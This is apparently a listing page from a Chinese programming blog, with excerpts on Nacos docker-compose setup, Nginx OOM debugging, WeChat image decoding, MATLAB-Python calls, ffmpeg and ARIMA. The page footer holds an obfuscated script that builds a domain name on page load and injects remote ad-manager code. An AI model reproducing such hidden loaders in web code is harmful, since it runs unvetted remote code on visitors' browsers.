Docker基础与实战，看这一篇就够了Docker-Compose基础与实战，看这一篇就够了 容器化 mysql 由于nacos需要依赖于Mysql作为资源存储，所以在编写完整docker-compose之前我会先用docker启动临时的mysql容器，然后准备好nacos需要的数据库。
启动临时容器docker run -p3306:3306 --rm --name mysql -e MYSQL_ROOT_PASSWORD=123456 -v /app/cloud/mysql/data:/var/lib/mysql mysql:5.7此处需要挂载宿主机目录，在启动docker-compse后就不需要再次初始化数据。用mysql客户端连接你的容器，然后导入nacos的数据表https://github.com/alibaba/nacos/tree/develop/distribution/conf/ nacos-mysql.sql 停止容器,由于加了--rm参数，所以容器会自动删除docker stop 3475ef078d3a nacos 我们来看看NACOS的环境变量，如下表所示：
Nacos支持主从配置，考虑到资源问题，我们只配置一台单独的mysql服务器，有资源的同学可以搭建主从环境。
sentinel sentinel比较简单，直接配置sentinel-dashboard镜像即可。（在系列的开始不需要引入sentinel组件，为了后面不再单独介绍，本次我也把他加到我的docker-compose中）
seata seata由于一些原因，还没发布官方镜像，暂时搁浅。
docker-compose 以下是我编写的docker-compse文件，大家可以自行修改
version: "3" services: mysql: container_name: mysql image: mysql:5.7 environment: - MYSQL_ROOT_PASSWORD=123456 volumes: - /app/cloud/mysql/data:/var/lib/mysql ports: - "3306:3306" restart: always nacos: image: nacos/nacos-server:1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e574e715c19585c78dd4eeed7dd97e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c2e5672020bb6bb6ade019454137407/" rel="bookmark">
			隔一段时间查找一次 golang_复工后一次百万长连接压测Nginx与OOM的问题排查分析，我裂开了！...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在最近的一次百万长连接压测中，32C 128G 的四台 Nginx 频繁出现 OOM，出现问题时的内存监控如下所示。
排查的过程记录如下。
现象描述 这是一个 websocket 百万长连接收发消息的压测环境，客户端 jmeter 用了上百台机器，经过四台 Nginx 到后端服务，简化后的部署结构如下图所示。
在维持百万连接不发数据时，一切正常，Nginx 内存稳定。在开始大量收发数据时，Nginx 内存开始以每秒上百 M 的内存增长，直到占用内存接近 128G，woker 进程开始频繁 OOM 被系统杀掉。32 个 worker 进程每个都占用接近 4G 的内存。dmesg -T 的输出如下所示。
[Fri Mar 13 18:46:44 2020] Out of memory: Kill process 28258 (nginx) score 30 or sacrifice child[Fri Mar 13 18:46:44 2020] Killed process 28258 (nginx) total-vm:1092198764kB, anon-rss:3943668kB, file-rss:736kB, shmem-rss:4kB复制代码 work 进程重启后，大量长连接断连，压测就没法继续增加数据量。
排查过程分析 拿到这个问题，首先查看了 Nginx 和客户端两端的网络连接状态，使用 ss -nt 命令可以在 Nginx 看到大量 ESTABLISH 状态连接的 Send-Q 堆积很大，客户端的 Recv-Q 堆积很大。Nginx 端的 ss 部分输出如下所示。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c2e5672020bb6bb6ade019454137407/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4002cb9f661984134d68f662321f78bb/" rel="bookmark">
			c&#43;&#43;读取.dat文件_微信 .dat图片格式转换为.jpg
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		异或，英文为exclusive OR，缩写成xor
异或（xor）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。异或也叫半加运算，其运算法则相当于不带进位的二进制加法：二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1），这些法则与加法是相同的，只是不带进位，所以异或常被认作不进位加法。例如：
十六进制（简写为hex或HEX下标16）:
C语言、C++、Shell、Python、Java语言及其他相近的语言使用字首“0x”，例如“0x5A3”。开头的“0”令解析器更易辨认数，而“x”则代表十六进制（就如“O”代表八进制）。在“0x”中的“x”可以大写或小写。对于字符量C语言中则以x+两位十六进制数的方式表示，如xFF。
.dat文件16进制解码
.jpg文件16进制解码
异或运算结果：0x8
转码程序：
import os
#微信image文件路径
into_path=r'F:Pythonfileweixin'
#微信图片转码后的保存位置
out_path = r'F:Pythonfileweixinweixin_picture/'#或写成F:Pythonfileweixinweixin_picture
def imageDecode(f,fn):
"""
解码
param f: 微信图片路径
param fn:微信图片目录下的.bat
return:
"""
# 读取.bat
dat_read = open(f,"rb")
# 图片输出路径
out = out_path + fn + ".jpg"
# 图片写入
png_write = open(out,"wb")
# 循环字节
for now in dat_read:
for nowByte in now:
# 转码计算
newByte = nowByte ^ 0x8
# 转码后重新写入
png_write.write(bytes([newByte]))
dat_read.close()
png_write.close()
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4002cb9f661984134d68f662321f78bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc6a83195c412fdb3a048d76cba42564/" rel="bookmark">
			matlab支持python吗_Python和MATLAB交互的基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MATLAB和Python可以在一定程度上互相调用，起到互补的作用。本文就来抛砖引玉，总结一些最基本的操作步骤。
在MATLAB调用Python
MATLAB里可以很方便的调用Python的模块。笔者在进行车震研究的时候，一方面要在MATLAB里验证算法，同时其它的组员用Python来把程序封装好用到车上去震。如果能够重复使用一些核心的算法，那就可以在很大程度上提高开发效率。为此，我尝试把一些比较常用的代码用Python来写，然后在MATLAB里面调用。
为此，我通过如下步骤设置了自己的环境( 我使用的Python版本是2.7. MATLAB我用的是R2016b，操作系统是Windows7, 64位）。
首先，我在自己的机器上安装Python, 注意我需要安装的是64位的，不然我的64位的MATLAB认不出来。安装包可以在这里下载：https://www.python.org/downloads/windows/
然后，我在Windows的命令行里使用下面的命令安装了一些进行科学计算的包，
C:\Python27&gt; pip install numpy
C:\Python27&gt; pip install scipy
C:\Python27&gt; pip install matlibplot
都弄完之后， 打开MATLAB, 输入pyversion, 结果如下
&gt;&gt; pyversion
version: '2.7'
executable: 'C:\Python27\python.EXE'
library: 'C:\windows\system32\python27.dll'
home: 'C:\Python27'
isloaded: 0
这说明MATLAB成功找到了Python解释器。
现在，我在Python里写了一个简单的类：
class myClass:
version = 1.0
def __init__(self,a,b):
self.a, self.b = a,b
def getsum(self):
return self.a+self.b
然后保存为文件 myPyClass.py
最后，打开MATLAB, 调用这个Python模块创建一个类，然后调用getsum方法，结果如下：
&gt;&gt; pyObj = py.myPyClass.myClass(1,2);
&gt;&gt; pyObj.getsum
ans =
3
就是这么简单。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc6a83195c412fdb3a048d76cba42564/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b58ead99e92b0725798aca9bc27806f/" rel="bookmark">
			ffmpeg 去除音频文件中的静音部分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ffmpeg 去除音频文件中的静音部分 0. 前提1. 使用ffmpeg去除音频静音1.1 python调用cmd命令1.2 直接使用cmd命令 2.ffmpeg 官方使用手册 0. 前提 电脑已经安装ffmpeg且已将其配置为环境变量 1. 使用ffmpeg去除音频静音 1.1 python调用cmd命令 import os cmd_commond="ffmpeg -i "+filename+" -af silenceremove=stop_periods=-1:stop_duration=0.2:stop_threshold=-30dB "+des_filename 这里的filename 表示输入的语音文件路径，des_filename 表示输出的语音文件路径 os.system(cmd_commond) 1.2 直接使用cmd命令 ffmpeg -i input.wav -af silenceremove=stop_periods=-1:stop_duration=1:stop_threshold=-30dB output.wav 剪去所有从开始到结束遇到的音频中超过1秒的静音片段， ffmpeg -i input.wav -af silenceremove=stop_periods=-1:stop_duration=0.3:stop_threshold=-30dB output.wav 剪去所有从开始到结束遇到的音频中超过0.3秒的静音片段， 2.ffmpeg 官方使用手册 silenceremove官方使用手册
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75e13e9e756a344a7a3d2afd5943e719/" rel="bookmark">
			VScode插件 Rainbow安装（代码彩虹屁神器）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 版权声明：本文参考了VSCode Rainbow Fart官方说明文档。
详情请移步官网。
概述 VSCode Rainbow Fart 是一个在你编程时持续夸你写的牛逼的扩展，可以根据代码关键字播放贴近代码意义的真人语音。亦可加载马老师语音包插件。
在应用商城下载https://marketplace.visualstudio.com/items?itemName=saekiraku.rainbow-fart在 VSCode 的菜单栏中找到 查看 - 命令面板，或使用快捷键 Ctrl + Shift + P（MacOS Command + Shift + P）呼出 命令面板。在 命令面板 中输入 &gt; Enable Rainbow Fart 并回车。此时应该会弹出一个消息通知，点击通知上的 Open 按钮。（如果没有弹窗可以手动打开,打开浏览器输入http://127.0.0.1:7777/）在打开的页面上点击 授权。享受编程吧！请尝试在 VSCode 中输入 function 关键字。
可以在导入里面导入自己喜欢的声音包。
还可以导入马老师语音包，详情请点击访问。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/562c94ae592f9b45f6ad4f0cb7084819/" rel="bookmark">
			matlab用arima数据建模_干货 | 数据驱动与时间序列实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着互联网的发展，我们逐渐从信息匮乏的时代进入了信息过载的时代。在这个海量数据的时代，无论是信息的消费者还是信息生产者都遇到了很大挑战。同样无论是消费者还是生产者都产生了海量的数据，各行各业也越来越意识到数据驱动的重要性，很多互联网企业文化中都有比较重要一条:用数据说话。
数据驱动 主要分为三部分：
数据驱动理念
数据驱动价值
数据驱动实践之数据建模[时序序列算法]
一、数据驱动理念 现在很多互联网从业人员，无论是产品经理的产品设计还是功能上线后的效果评估，又或者是工程师开发的模块性能，都是需要用数据说话。
如果没有数据来支撑，方案是无法通过的，所以需要用科学的数据方法来支撑即数据驱动。
很多人认为，数据驱动就是把一些开源组件凑在一起即可，但是真正在企业实践中，会发现人才储备、数据源、数据流、数据分析等一系列问题就开始凸显出来,并不是技术栈的叠加。
什么是数据驱动？数据驱动是通过移动互联网或者其他的相关软件为手段采集海量的数据，将数据进行组织形成信息，之后对相关的信息进行整合和提炼，在数据的基础上经过训练和拟合形成自动化的决策和智能模型。 现在企业聚焦点逐步向如何将企业内外部产生的数据高效应用，从而让企业决策不再依赖“拍脑袋”，而是转向依靠“数据驱动”。
二、数据驱动的价值 数据是信息的一种存储形式，而信息是消除不确定性的东西。我们需要将信息转化为企业有用的价值，即将离散元素(数据)-&gt;信息(连接元素)-&gt;知识(组织信息)-&gt;智慧(应用知识)。
数据驱动的价值主要分为:
驱动决策
驱动产品智能 那么数据驱动如何实践？数据驱动是一种流式和自助式的闭环驱动,主要的过程:
数据采集 (mobile/pc/sensor等)
数据建模
(supervised/unsupervised/reinforcement/semi-supervisedlearning/time series等)
数据分析 (下钻/留存/属性/用户分群分析等)
数据反馈 (check/review等)
三、时间序列算法 由于数据驱动整个闭环比较复杂，只应用数据驱动环节中一小部分实践-数据建模。
简单介绍一下时间序列算法分析,时间序列三大“组件”:Trend(趋势)、Seasonal(周期)和Random(随机波动)。(编程语言R,公式MathJax)
1、趋势
发现数据的趋势是我们作为算法工程师最基本的要求，最容易的分析就是smoothing method。
plot(Data['2016/'])
#green最近30个交易日的smoothingmethod
lines(SMA(Data['2015-12-01/'],n=30),col= "green")
#blue最近10个交易日的smoothingmethod
lines(SMA(Data['2015-12-15/'],n=10),col= "blue")
#red 最近5个交易日的smoothingmethod
lines(SMA(Data['2015-12-20/'],n=5),col= "red")
如下图所示：
2、周期
比如气温等时间序列数据是带有周期性的，我们以北京地区每日最高气温，呈现波形趋势，基本上也是以年作为周期的。 beijing = xts(data, sep = ",",fileEncoding = "GBK"), order.by = seq.Date(as.Date("2011-02-01"), as.Date("2017-01-31"), "day"))
class(beijing)
plot(beijing)
3、随机波动
一个时间序列可以不存在周期性、也可以不存在趋势，但肯定存在不规则的波动。理论上数据应该符合正太分布的。
4、时间序列预测分析
我们常用的时间序列分析模型:指数平滑算法和ARIMA算法。
指数平滑算法模型原理
该说明预测值收到序列中每个观测值的影响，可以看出随着n的增大，该项的n次方对预测值是越来越小的。基于该算法衍生了很多models:Holt和Winter等等。
ARIMA(p,d,q)模型原理
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/562c94ae592f9b45f6ad4f0cb7084819/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/401/">«</a>
	<span class="pagination__item pagination__item--current">402/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/403/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>